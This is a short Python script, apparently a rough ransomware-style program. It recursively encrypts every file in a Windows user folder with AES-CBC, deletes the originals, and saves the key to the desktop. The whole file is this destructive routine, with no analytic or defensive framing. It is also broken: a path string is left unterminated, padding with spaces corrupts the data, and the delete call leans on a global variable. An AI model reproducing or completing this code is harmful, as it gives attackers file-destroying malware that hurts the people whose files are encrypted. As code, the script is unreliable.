import os               
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import time

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(cipher.encrypt(chunk))
                
        
    os.remove(file_path)
#move to a diff directory
 


if __name__ == '__main__':
    key = get_random_bytes(16)
    print('Encryption key:', key.hex())

    folder_path = ("C:\\Users\\username\\foldername")
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(key, file_path)
desktop = "C:\\Users\\username\\desktop
key_file_path = os.path.join(desktop, 'key.txt')
with open(key_file_path, 'wb') as key_file:
    key_file.write(key)
    

input()
